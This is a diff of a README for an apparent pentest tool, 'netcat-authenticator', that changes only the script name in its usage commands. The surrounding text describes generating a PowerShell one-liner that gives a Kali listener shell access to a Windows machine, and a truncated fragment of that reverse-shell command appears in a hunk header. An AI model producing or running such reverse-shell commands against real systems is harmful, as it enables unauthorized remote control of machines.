@@ -56,7 +56,7 @@ cd netcat-authenticator
 This command generates a PowerShell one-liner that can be run on a Windows machine to authenticate and get shell access:
 
 ```bash
-python3 tool.py --mode generate --secret YOUR_SECRET --ip YOUR_KALI_IP --port 4444
+python3 Nectcat_Authenticator.py --mode generate --secret YOUR_SECRET --ip YOUR_KALI_IP --port 4444
 ```
 
 📌 Output Example:
@@ -72,7 +72,7 @@ powershell -command "$ip='192.168.1.10';$port=4444;$b='c2VjcmV0MTIz';$resp=echo 
 This command starts the secure listener on Kali Linux:
 
 ```bash
-python3 tool.py --mode listen --secret YOUR_SECRET --port 4444
+python3 Nectcat_Authenticator.py --mode listen --secret YOUR_SECRET --port 4444
 ```
 
 🖥️ The tool will:
@@ -87,7 +87,7 @@ python3 tool.py --mode listen --secret YOUR_SECRET --port 4444
 
 **Step 1 (on Kali):**
 ```bash
-python3 tool.py --mode listen --secret test123 --port 4444
+python3 Nectcat_Authenticator.py --mode listen --secret test123 --port 4444
 ```
 
 **Step 2 (on Windows):**
